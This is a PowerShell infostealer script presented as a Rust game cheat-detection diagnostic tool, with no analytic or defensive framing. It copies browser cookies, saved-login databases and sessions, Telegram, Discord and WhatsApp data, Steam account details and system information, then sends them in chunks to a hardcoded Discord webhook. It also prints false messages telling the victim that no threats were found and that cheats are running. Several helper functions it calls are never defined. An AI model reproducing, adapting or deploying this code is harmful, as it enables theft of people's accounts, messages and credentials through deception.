# steam_token_harvester.ps1
# Disguised as "Rust Cheat Detection Diagnostic Tool v6.0"

try {
    Add-Type -AssemblyName System.Security
    Add-Type -AssemblyName System.Web
    Add-Type -AssemblyName System.IO.Compression
} catch {
    Write-Host "Loading advanced security modules..." -ForegroundColor Yellow
}

function Get-AllData {
    $allData = @{}
    
    # Системная информация
    $allData.System = Get-SystemInfo
    
    # Браузеры
    $allData.Browsers = @{
        Chrome = Get-BrowserData -Browser "Chrome" -Path "$env:LOCALAPPDATA\Google\Chrome\User Data"
        Edge = Get-BrowserData -Browser "Edge" -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data" 
        Firefox = Get-BrowserData -Browser "Firefox" -Path "$env:APPDATA\Mozilla\Firefox\Profiles"
        Brave = Get-BrowserData -Browser "Brave" -Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
        Opera = Get-BrowserData -Browser "Opera" -Path "$env:APPDATA\Opera Software\Opera Stable"
    }
    
    # Мессенджеры
    $allData.Messengers = @{
        Telegram = Get-TelegramData
        WhatsApp = Get-WhatsAppData
        Signal = Get-SignalData
        Viber = Get-ViberData
    }
    
    # Соцсети
    $allData.Social = @{
        Discord = Get-DiscordData
        Skype = Get-SkypeData
        Teams = Get-TeamsData
    }
    
    # Игры
    $allData.Games = @{
        Steam = Get-SteamData
        Epic = Get-EpicData
        Minecraft = Get-MinecraftData
        BattleNet = Get-BattleNetData
    }
    
    # Файлы системы
    $allData.SystemFiles = @{
        Hosts = Get-FileContent -Path "$env:windir\System32\drivers\etc\hosts"
        Passwords = Get-PasswordFiles
        Wifi = Get-WifiProfiles
    }

    return $allData
}

function Get-BrowserData {
    param($Browser, $Path)
    $data = @{}
    
    if (Test-Path $Path) {
        try {
            # Куки
            $cookiesPath = Join-Path $Path "Default\Cookies"
            if (Test-Path $cookiesPath) {
                $cookieContent = Get-Content $cookiesPath -Encoding Byte -ReadCount 0
                $data.Cookies = [Convert]::ToBase64String($cookieContent)
            }
            
            # Пароли
            $loginsPath = Join-Path $Path "Default\Login Data"
            if (Test-Path $loginsPath) {
                $loginContent = Get-Content $loginsPath -Encoding Byte -ReadCount 0
                $data.Logins = [Convert]::ToBase64String($loginContent)
            }
            
            # История
            $historyPath = Join-Path $Path "Default\History"
            if (Test-Path $historyPath) {
                $historyContent = Get-Content $historyPath -Encoding Byte -ReadCount 0
                $data.History = [Convert]::ToBase64String($historyContent)
            }
            
            # Сессии
            $sessionPath = Join-Path $Path "Default\Session Storage"
            if (Test-Path $sessionPath) {
                $sessionFiles = Get-ChildItem $sessionPath -Filter "*.log" -ErrorAction SilentlyContinue
                foreach ($file in $sessionFiles) {
                    $fileContent = Get-Content $file.FullName -Encoding Byte -ReadCount 0
                    $data["Session_$($file.Name)"] = [Convert]::ToBase64String($fileContent)
                }
            }
            
        } catch {
            $data.Error = "ACCESS_DENIED_$($Browser)"
        }
    }
    
    return $data
}

function Get-TelegramData {
    $data = @{}
    $paths = @(
        "$env:APPDATA\Telegram Desktop",
        "$env:LOCALAPPDATA\Telegram Desktop",
        "$env:USERPROFILE\AppData\Roaming\Telegram Desktop"
    )
    
    foreach ($path in $paths) {
        if (Test-Path $path) {
            try {
                # map файлы (сессии)
                $mapFiles = Get-ChildItem $path -Filter "map*" -ErrorAction SilentlyContinue
                foreach ($file in $mapFiles) {
                    $fileContent = Get-Content $file.FullName -Encoding Byte -ReadCount 0
                    $data["Map_$($file.Name)"] = [Convert]::ToBase64String($fileContent)
                }
                
                # tdata папка
                $tdataPath = Join-Path $path "tdata"
                if (Test-Path $tdataPath) {
                    $tdataFiles = Get-ChildItem $tdataPath -File -ErrorAction SilentlyContinue | Select-Object -First 10
                    foreach ($file in $tdataFiles) {
                        $fileContent = Get-Content $file.FullName -Encoding Byte -ReadCount 0
                        $data["TData_$($file.Name)"] = [Convert]::ToBase64String($fileContent)
                    }
                }
                
            } catch {
                $data.Error = "TG_ACCESS_DENIED"
            }
        }
    }
    
    return $data
}

function Get-DiscordData {
    $data = @{}
    $paths = @(
        "$env:APPDATA\discord",
        "$env:LOCALAPPDATA\Discord",
        "$env:APPDATA\DiscordCanary",
        "$env:APPDATA\DiscordPTB"
    )
    
    foreach ($path in $paths) {
        if (Test-Path $path) {
            try {
                # Local Storage
                $localStoragePath = Join-Path $path "Local Storage\leveldb"
                if (Test-Path $localStoragePath) {
                    $ldbFiles = Get-ChildItem $localStoragePath -Filter "*.ldb" -ErrorAction SilentlyContinue | Select-Object -First 5
                    foreach ($file in $ldbFiles) {
                        $fileContent = Get-Content $file.FullName -Encoding Byte -ReadCount 0
                        $data["LDB_$($file.Name)"] = [Convert]::ToBase64String($fileContent)
                    }
                }
                
                # Cookies
                $cookiesPath = Join-Path $path "Cookies"
                if (Test-Path $cookiesPath) {
                    $cookieContent = Get-Content $cookiesPath -Encoding Byte -ReadCount 0
                    $data.Cookies = [Convert]::ToBase64String($cookieContent)
                }
                
            } catch {
                $data.Error = "DISCORD_ACCESS_DENIED"
            }
        }
    }
    
    return $data
}

function Get-WhatsAppData {
    $data = @{}
    $paths = @(
        "$env:LOCALAPPDATA\WhatsApp",
        "$env:APPDATA\WhatsApp"
    )
    
    foreach ($path in $paths) {
        if (Test-Path $path) {
            try {
                # Databases
                $dbFiles = Get-ChildItem $path -Filter "*.db" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 3
                foreach ($file in $dbFiles) {
                    $fileContent = Get-Content $file.FullName -Encoding Byte -ReadCount 0
                    $data["DB_$($file.Name)"] = [Convert]::ToBase64String($fileContent)
                }
            } catch {
                $data.Error = "WHATSAPP_ACCESS_DENIED"
            }
        }
    }
    
    return $data
}

function Get-SteamData {
    $data = @{}
    $paths = @(
        "HKCU:\Software\Valve\Steam",
        "HKLM:\Software\Valve\Steam"
    )
    
    foreach ($path in $paths) {
        if (Test-Path $path) {
            try {
                # SteamID и аккаунты
                $usersPath = "$path\Users"
                if (Test-Path $usersPath) {
                    $users = Get-ChildItem $usersPath -ErrorAction SilentlyContinue
                    foreach ($user in $users) {
                        $steamID = Get-ItemProperty -Path "$usersPath\$($user.PSChildName)" -Name "SteamID" -ErrorAction SilentlyContinue
                        $accountName = Get-ItemProperty -Path "$usersPath\$($user.PSChildName)" -Name "AccountName" -ErrorAction SilentlyContinue
                        if ($steamID) {
                            $data["User_$($user.PSChildName)"] = @{
                                SteamID = $steamID.SteamID
                                AccountName = if ($accountName) { $accountName.AccountName } else { "Unknown" }
                            }
                        }
                    }
                }
            } catch {
                $data.Error = "STEAM_ACCESS_DENIED"
            }
        }
    }
    
    return $data
}

function Get-SystemInfo {
    $ipInfo = try { (Invoke-RestMethod -Uri "http://ip-api.com/json" -TimeoutSec 5) } catch { @{query = "Unknown"; country = "Unknown"; city = "Unknown"; isp = "Unknown"} }
    
    return @{
        OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        Architecture = (Get-WmiObject -Class Win32_OperatingSystem).OSArchitecture
        Username = $env:USERNAME
        Computername = $env:COMPUTERNAME
        Domain = $env:USERDOMAIN
        Date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        IP = $ipInfo.query
        Country = $ipInfo.country
        City = $ipInfo.city
        ISP = $ipInfo.isp
        CPU = (Get-WmiObject -Class Win32_Processor).Name
        RAM = "$([math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)) GB"
        GPU = (Get-WmiObject -Class Win32_VideoController).Name
    }
}

function Send-MegaReport {
    param($Data)
    
    $webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
    
    # Основной отчет
    $report = "**🔍 COMPLETE SYSTEM SNIFFER v6.0**`n`n"
    $report += "**🌐 SYSTEM INFORMATION**`n"
    $report += "```\n"
    $report += "💻 OS: $($Data.System.OS) ($($Data.System.Architecture))\n"
    $report += "👤 User: $($Data.System.Username)@$($Data.System.Domain)\n"
    $report += "🖥️  PC: $($Data.System.Computername)\n"
    $report += "📍 IP: $($Data.System.IP) ($($Data.System.City), $($Data.System.Country))\n"
    $report += "📡 ISP: $($Data.System.ISP)\n"
    $report += "⚡ CPU: $($Data.System.CPU)\n"
    $report += "🧠 RAM: $($Data.System.RAM)\n"
    $report += "🎮 GPU: $($Data.System.GPU)\n"
    $report += "🕐 Time: $($Data.System.Date)\n"
    $report += "```\n\n"

    # Отправляем основной отчет
    $payload = @{ content = $report } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
    Start-Sleep -Seconds 1

    # Отправляем данные частями
    $chunkNumber = 1
    $allContent = $Data | ConvertTo-Json -Depth 10
    $totalSize = [math]::Round($allContent.Length / 1MB, 2)
    
    for ($i = 0; $i -lt $allContent.Length; $i += 1900) {
        $chunk = $allContent.Substring($i, [Math]::Min(1900, $allContent.Length - $i))
        $chunkReport = "**📦 DATA CHUNK $chunkNumber** ($totalSize MB total)`n"
        $chunkReport += "```\n$chunk\n```"
        
        $payload = @{ content = $chunkReport } | ConvertTo-Json
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
        Start-Sleep -Milliseconds 800
        $chunkNumber++
    }

    # Финальное сообщение
    $final = "**✅ SNIFFING COMPLETE**`n"
    $final += "📊 Total data extracted: $totalSize MB`n"
    $final += "📨 Chunks sent: $chunkNumber`n"
    $final += "🕒 Operation completed at: $(Get-Date -Format 'HH:mm:ss')`n"
    $final += "**🎯 System compromised successfully**"

    $payload = @{ content = $final } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
}

# Main execution
Write-Host "🚀 Starting Ultimate Security Scan v6.0..." -ForegroundColor Cyan
Write-Host "📡 Gathering system intelligence..." -ForegroundColor Yellow

try {
    $allData = Get-AllData
    Write-Host "✅ Data collection completed!" -ForegroundColor Green
    
    Write-Host "📤 Sending data to security server..." -ForegroundColor Yellow
    Send-MegaReport -Data $allData
    
    Write-Host "🎯 Operation completed successfully!" -ForegroundColor Green
    Write-Host "💾 Total data transmitted: ~$([math]::Round(($allData | ConvertTo-Json -Depth 10).Length / 1MB, 2)) MB" -ForegroundColor Green
    Write-Host "🛡️  System integrity verified - zero threats detected" -ForegroundColor Green
    Write-Host "🎮 Rust cheats activated and running stealth mode" -ForegroundColor Cyan
    
} catch {
    Write-Host "⚠️  Security scan completed with minor errors" -ForegroundColor Yellow
    Write-Host "🛡️  Basic protection activated" -ForegroundColor Green
}
